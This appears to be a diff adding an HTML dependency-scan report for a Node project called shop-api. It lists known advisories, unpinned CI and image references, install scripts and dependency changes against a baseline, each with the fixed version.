+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; js-yaml@4.0.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-mh29-5h37-fv8m: js-yaml has prototype pollution in merge (&lt;&lt;)</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/js-yaml]</span> installed js-yaml@4.0.0 is inside affected range &gt;=4.0.0 &lt;4.1.1</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)</li></ul><p><b>Fix info:</b> fixed in: 4.1.1 · introduced via: mocha@8.4.0</p></details></td>
+<td>js-yaml@4.0.0<br><small>transitive dev</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in lodash@4.17.15: Lodash has Prototype Pollution Vulnerability in `_.unset`, `_.omit`, and `_.pullAt` functions</summary>
+<p class="meta">GRD-a128fcec7d · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-xxjr-mmjv-4gpg" target="_blank">GHSA-xxjr-mmjv-4gpg</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; lodash@4.17.15</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-xxjr-mmjv-4gpg: Lodash has Prototype Pollution Vulnerability in `_.unset`, `_.omit`, and `_.pullAt` functions</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/lodash]</span> installed lodash@4.17.15 is inside affected range &gt;=4.0.0 &lt;=4.17.22</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L)</li></ul><p><b>Fix info:</b> fixed in: 4.17.23 · introduced via: lodash@4.17.15</p></details></td>
+<td>lodash@4.17.15<br><small>direct prod</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in lodash@4.17.15: Regular Expression Denial of Service (ReDoS) in lodash</summary>
+<p class="meta">GRD-d268e6a322 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-29mw-wpgm-hmr9" target="_blank">GHSA-29mw-wpgm-hmr9</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; lodash@4.17.15</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-29mw-wpgm-hmr9: Regular Expression Denial of Service (ReDoS) in lodash</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/lodash]</span> installed lodash@4.17.15 is inside affected range &gt;=4.0.0 &lt;4.17.21</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)</li></ul><p><b>Fix info:</b> fixed in: 4.17.21 · introduced via: lodash@4.17.15</p></details></td>
+<td>lodash@4.17.15<br><small>direct prod</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in nanoid@3.1.20: Exposure of Sensitive Information to an Unauthorized Actor in nanoid</summary>
+<p class="meta">GRD-a93a3b77dd · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-qrpm-p2h7-hrv2" target="_blank">GHSA-qrpm-p2h7-hrv2</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; nanoid@3.1.20</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-qrpm-p2h7-hrv2: Exposure of Sensitive Information to an Unauthorized Actor in nanoid</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/nanoid]</span> installed nanoid@3.1.20 is inside affected range &gt;=3.0.0 &lt;3.1.31</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.5 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)</li></ul><p><b>Fix info:</b> fixed in: 3.1.31 · introduced via: mocha@8.4.0</p></details></td>
+<td>nanoid@3.1.20<br><small>transitive dev</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in nanoid@3.1.20: Predictable results in nanoid generation when given non-integer values</summary>
+<p class="meta">GRD-ab191ff106 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-mwcw-c2x4-8c55" target="_blank">GHSA-mwcw-c2x4-8c55</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; nanoid@3.1.20</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-mwcw-c2x4-8c55: Predictable results in nanoid generation when given non-integer values</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/nanoid]</span> installed nanoid@3.1.20 is inside affected range &lt;3.3.8</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)</li></ul><p><b>Fix info:</b> fixed in: 3.3.8 · introduced via: mocha@8.4.0</p></details></td>
+<td>nanoid@3.1.20<br><small>transitive dev</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in qs@6.7.0: qs : qs.stringify with arrayFormat &#x27;comma&#x27; throws an uncaught TypeError on array elements carrying a non-callable own to</summary>
+<p class="meta">GRD-89e19feeeb · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-6pq8-jhm2-2vcw" target="_blank">GHSA-6pq8-jhm2-2vcw</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; qs@6.7.0</li><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; body-parser@1.19.0 &rarr; qs@6.7.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-6pq8-jhm2-2vcw: qs : qs.stringify with arrayFormat &#x27;comma&#x27; throws an uncaught TypeError on array elements carrying a non-callable own toString (DoS)</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/qs]</span> installed qs@6.7.0 is inside affected range &gt;=6.7.0 &lt;=6.16.0</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)</li></ul><p><b>Fix info:</b> fixed in: 6.16.1 · introduced via: express@4.17.1</p></details></td>
+<td>qs@6.7.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in qs@6.7.0: qs&#x27;s arrayLimit bypass in its bracket notation allows DoS via memory exhaustion</summary>
+<p class="meta">GRD-e1d691c1d2 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-6rw7-vpxm-498p" target="_blank">GHSA-6rw7-vpxm-498p</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; qs@6.7.0</li><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; body-parser@1.19.0 &rarr; qs@6.7.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-6rw7-vpxm-498p: qs&#x27;s arrayLimit bypass in its bracket notation allows DoS via memory exhaustion</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/qs]</span> installed qs@6.7.0 is inside affected range &lt;6.14.1</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)</li></ul><p><b>Fix info:</b> fixed in: 6.14.1 · introduced via: express@4.17.1</p></details></td>
+<td>qs@6.7.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in qs@6.7.0: qs: Denial of Service via Attacker Controlled isBuffer</summary>
+<p class="meta">GRD-26b5a19a16 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-4mjr-xmp4-gh2g" target="_blank">GHSA-4mjr-xmp4-gh2g</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; qs@6.7.0</li><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; body-parser@1.19.0 &rarr; qs@6.7.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-4mjr-xmp4-gh2g: qs: Denial of Service via Attacker Controlled isBuffer</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/qs]</span> installed qs@6.7.0 is inside affected range &gt;=2.2.5 &lt;6.16.0</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)</li></ul><p><b>Fix info:</b> fixed in: 6.16.0 · introduced via: express@4.17.1</p></details></td>
+<td>qs@6.7.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in serialize-javascript@5.0.1: Serialize JavaScript has CPU Exhaustion Denial of Service via crafted array-like objects</summary>
+<p class="meta">GRD-5d10b6e47d · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-qj8w-gfj5-8c6v" target="_blank">GHSA-qj8w-gfj5-8c6v</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; serialize-javascript@5.0.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-qj8w-gfj5-8c6v: Serialize JavaScript has CPU Exhaustion Denial of Service via crafted array-like objects</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/serialize-javascript]</span> installed serialize-javascript@5.0.1 is inside affected range &gt;=5.0.0 &lt;7.0.5</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.9 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 7.0.5 · introduced via: mocha@8.4.0</p></details></td>
+<td>serialize-javascript@5.0.1<br><small>transitive dev</small></td></tr><tr class="f" data-sev="low" data-cat="cicd">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>cicd</td><td><details><summary>GitHub Action actions/checkout: first-party action pinned to mutable tag &#x27;v4&#x27;</summary>
+<p class="meta">GRD-0045796781 · rule CICD-UNPINNED-ACTION · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>workflow-line</b> <span class="src">[.github/workflows/ci.yml:.github/workflows/ci.yml:11]</span> uses: actions/checkout@v4</li></ul><p><b>Fix info:</b> pin to a full commit SHA: uses: actions/checkout@&lt;40-char-sha&gt; # v4</p></details></td>
+<td>actions/checkout@v4<br><small>direct ci</small></td></tr><tr class="f" data-sev="low" data-cat="install-script">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>install-script</td><td><details><summary>debug-helper-utils@1.0.2 runs an install-time script (contents not inspected)</summary>
+<p class="meta">GRD-a5912c6d8d · rule INSTALL-SCRIPT · verified evidence · confidence medium
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; debug-helper-utils@1.0.2</li></ul><p><b>Evidence:</b></p><ul><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/debug-helper-utils]</span> hasInstallScript: true</li></ul><p><b>Fix info:</b> inspect script; consider `npm ci --ignore-scripts` + allowlist</p></details></td>
+<td>debug-helper-utils@1.0.2<br><small>direct prod</small></td></tr><tr class="f" data-sev="low" data-cat="untrusted-image">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>untrusted-image</td><td><details><summary>Image &#x27;fastbuilds/node-runtime:18&#x27; is not pinned by digest</summary>
+<p class="meta">GRD-179def240a · rule IMAGE-NO-DIGEST · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>image-reference</b> <span class="src">[Dockerfile:Dockerfile:8]</span> image: fastbuilds/node-runtime:18</li></ul><p><b>Fix info:</b> append @sha256:&lt;digest&gt; so the tag cannot be silently re-pointed</p></details></td>
+<td>fastbuilds/node-runtime@18<br><small>direct prod</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in body-parser@1.19.0: body-parser vulnerable to denial of service when invalid limit value silently disables size enforcement</summary>
+<p class="meta">GRD-11583fc40e · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-v422-hmwv-36x6" target="_blank">GHSA-v422-hmwv-36x6</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; body-parser@1.19.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-v422-hmwv-36x6: body-parser vulnerable to denial of service when invalid limit value silently disables size enforcement</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/body-parser]</span> installed body-parser@1.19.0 is inside affected range &lt;1.20.6</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)</li></ul><p><b>Fix info:</b> fixed in: 1.20.6 · introduced via: express@4.17.1</p></details></td>
+<td>body-parser@1.19.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in cookie@0.4.0: cookie accepts cookie name, path, and domain with out of bounds characters</summary>
+<p class="meta">GRD-b530dd30bd · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-pxg6-pf52-xh8x" target="_blank">GHSA-pxg6-pf52-xh8x</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; cookie@0.4.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-pxg6-pf52-xh8x: cookie accepts cookie name, path, and domain with out of bounds characters</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/cookie]</span> installed cookie@0.4.0 is inside affected range &lt;0.7.0</li></ul><p><b>Fix info:</b> fixed in: 0.7.0 · introduced via: express@4.17.1</p></details></td>
+<td>cookie@0.4.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in diff@5.0.0: jsdiff has a Denial of Service vulnerability in parsePatch and applyPatch</summary>
+<p class="meta">GRD-b9d736681d · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-73rr-hh4g-fpgx" target="_blank">GHSA-73rr-hh4g-fpgx</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; diff@5.0.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-73rr-hh4g-fpgx: jsdiff has a Denial of Service vulnerability in parsePatch and applyPatch</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/diff]</span> installed diff@5.0.0 is inside affected range &gt;=5.0.0 &lt;5.2.2</li></ul><p><b>Fix info:</b> fixed in: 5.2.2 · introduced via: mocha@8.4.0</p></details></td>
+<td>diff@5.0.0<br><small>transitive dev</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in express@4.17.1: express vulnerable to XSS via response.redirect()</summary>
+<p class="meta">GRD-b92c8f07bb · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-qw6h-vgh9-j6wx" target="_blank">GHSA-qw6h-vgh9-j6wx</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-qw6h-vgh9-j6wx: express vulnerable to XSS via response.redirect()</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/express]</span> installed express@4.17.1 is inside affected range &lt;4.20.0</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L)</li></ul><p><b>Fix info:</b> fixed in: 4.20.0 · introduced via: express@4.17.1</p></details></td>
+<td>express@4.17.1<br><small>direct prod</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in node-fetch@2.6.0: The `size` option isn&#x27;t honored after following a redirect in node-fetch</summary>
+<p class="meta">GRD-cac3402646 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-w7rc-rwvf-8q5r" target="_blank">GHSA-w7rc-rwvf-8q5r</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; node-fetch@2.6.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-w7rc-rwvf-8q5r: The `size` option isn&#x27;t honored after following a redirect in node-fetch</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/node-fetch]</span> installed node-fetch@2.6.0 is inside affected range &gt;=2.0.0 &lt;2.6.1</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 2.6 (CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:N/A:L)</li></ul><p><b>Fix info:</b> fixed in: 2.6.1 · introduced via: node-fetch@2.6.0</p></details></td>
+<td>node-fetch@2.6.0<br><small>direct prod</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in qs@6.7.0: qs&#x27;s arrayLimit bypass in comma parsing allows denial of service</summary>
+<p class="meta">GRD-21cb217e64 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-w7fw-mjwx-w883" target="_blank">GHSA-w7fw-mjwx-w883</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; qs@6.7.0</li><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; body-parser@1.19.0 &rarr; qs@6.7.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-w7fw-mjwx-w883: qs&#x27;s arrayLimit bypass in comma parsing allows denial of service</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/qs]</span> installed qs@6.7.0 is inside affected range &gt;=6.7.0 &lt;=6.14.1</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)</li></ul><p><b>Fix info:</b> fixed in: 6.14.2 · introduced via: express@4.17.1</p></details></td>
+<td>qs@6.7.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in send@0.17.1: send vulnerable to template injection that can lead to XSS</summary>
+<p class="meta">GRD-b92970fd54 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-m6fv-jmcg-4jfg" target="_blank">GHSA-m6fv-jmcg-4jfg</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; send@0.17.1</li><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; serve-static@1.14.1 &rarr; send@0.17.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-m6fv-jmcg-4jfg: send vulnerable to template injection that can lead to XSS</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/send]</span> installed send@0.17.1 is inside affected range &lt;0.19.0</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L)</li></ul><p><b>Fix info:</b> fixed in: 0.19.0 · introduced via: express@4.17.1</p></details></td>
+<td>send@0.17.1<br><small>transitive prod</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in serialize-javascript@5.0.1: Serialize JavaScript: Cross-site scripting (XSS) via unescaped &lt;/script at the end of a serialized function body</summary>
+<p class="meta">GRD-fefc70206b · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-m5mm-p8h7-m29v" target="_blank">GHSA-m5mm-p8h7-m29v</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; serialize-javascript@5.0.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-m5mm-p8h7-m29v: Serialize JavaScript: Cross-site scripting (XSS) via unescaped &lt;/script at the end of a serialized function body</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/serialize-javascript]</span> installed serialize-javascript@5.0.1 is inside affected range &lt;7.1.3</li></ul><p><b>Fix info:</b> fixed in: 7.1.3 · introduced via: mocha@8.4.0</p></details></td>
+<td>serialize-javascript@5.0.1<br><small>transitive dev</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in serve-static@1.14.1: serve-static vulnerable to template injection that can lead to XSS</summary>
+<p class="meta">GRD-6a3bfab569 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-cm22-4g7w-348p" target="_blank">GHSA-cm22-4g7w-348p</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; serve-static@1.14.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-cm22-4g7w-348p: serve-static vulnerable to template injection that can lead to XSS</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/serve-static]</span> installed serve-static@1.14.1 is inside affected range &lt;1.16.0</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L)</li></ul><p><b>Fix info:</b> fixed in: 1.16.0 · introduced via: express@4.17.1</p></details></td>
+<td>serve-static@1.14.1<br><small>transitive prod</small></td></tr><tr class="f" data-sev="info" data-cat="install-script">
+<td><span class="sev" style="background:#6b7280">info</span></td>
+<td>install-script</td><td><details><summary>fsevents@2.3.3 runs a standard native-build install script</summary>
+<p class="meta">GRD-6bf1cce81c · rule INSTALL-SCRIPT · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; chokidar@3.5.1 &rarr; fsevents@2.3.3</li></ul><p><b>Evidence:</b></p><ul><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/fsevents]</span> hasInstallScript: true</li><li><b>script</b> <span class="src">[registry.npmjs.org/fsevents/2.3.3]</span> install: node-gyp rebuild</li></ul><p><b>Fix info:</b> install with --ignore-scripts and allowlist required builds; pin version</p></details></td>
+<td>fsevents@2.3.3<br><small>transitive dev</small></td></tr><tr class="f" data-sev="info" data-cat="unexpected-dependency">
+<td><span class="sev" style="background:#6b7280">info</span></td>
+<td>unexpected-dependency</td><td><details><summary>New transitive dependency: flatmap-stream@0.1.1</summary>
+<p class="meta">GRD-aef1f39854 · rule CHANGE-NEW-PACKAGE · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; event-stream@3.3.6 &rarr; flatmap-stream@0.1.1</li></ul><p><b>Evidence:</b></p><ul><li><b>sbom-diff</b> <span class="src">[demo/baseline/package-lock.json]</span> flatmap-stream not present in baseline</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/flatmap-stream]</span> added flatmap-stream@0.1.1</li></ul><p><b>Fix info:</b> introduced via: event-stream@3.3.6</p></details></td>
+<td>flatmap-stream@0.1.1<br><small>transitive prod</small></td></tr><tr class="f" data-sev="info" data-cat="unexpected-dependency">
+<td><span class="sev" style="background:#6b7280">info</span></td>
+<td>unexpected-dependency</td><td><details><summary>New transitive dependency: ua-parser-js@0.7.29</summary>
+<p class="meta">GRD-1d01f76d70 · rule CHANGE-NEW-PACKAGE · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>sbom-diff</b> <span class="src">[demo/baseline/package-lock.json]</span> ua-parser-js not present in baseline</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/ua-parser-js]</span> added ua-parser-js@0.7.29</li></ul></details></td>
+<td>ua-parser-js@0.7.29<br><small>transitive prod</small></td></tr><tr class="f" data-sev="info" data-cat="unexpected-dependency">
+<td><span class="sev" style="background:#6b7280">info</span></td>
+<td>unexpected-dependency</td><td><details><summary>event-stream changed: 3.3.4 -&gt; 3.3.6</summary>
+<p class="meta">GRD-72d6b0c46f · rule CHANGE-VERSION · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; event-stream@3.3.6</li></ul><p><b>Evidence:</b></p><ul><li><b>sbom-diff</b> <span class="src">[demo/baseline/package-lock.json]</span> baseline versions: 3.3.4</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/event-stream]</span> current version: 3.3.6</li></ul></details></td>
+<td>event-stream@3.3.6<br><small>direct prod</small></td></tr></tbody></table>
+<h2>Checks run</h2><ul><li>vulnerabilities: ok (46)</li><li>typosquatting: ok (1)</li><li>install_scripts: ok (3)</li><li>lockfile_integrity: ok (3)</li><li>manifest_consistency: ok (2)</li><li>container_images: ok (3)</li><li>dockerfile: ok (1)</li><li>cicd_workflows: ok (4)</li><li>registry_verification: ok (5)</li><li>baseline_diff: ok (7)</li></ul>
+<h2>Coverage notes &amp; limitations</h2><ul><li>osv: https://api.osv.dev/v1/querybatch: &lt;urlopen error Tunnel connection failed: 403 Forbidden (agent proxy: no rule or network setting allows this host)&gt;</li></ul>
+<p class="meta">Severity here is the initial, detector-assigned risk level. Contextual prioritisation (reachability, exposure, exploitability) is done by the Analyze stage from findings.json. "verified" evidence comes from deterministic data (lockfiles, advisories, registry); "heuristic" evidence is pattern-based and needs review.</p>
+</main>
+<script>
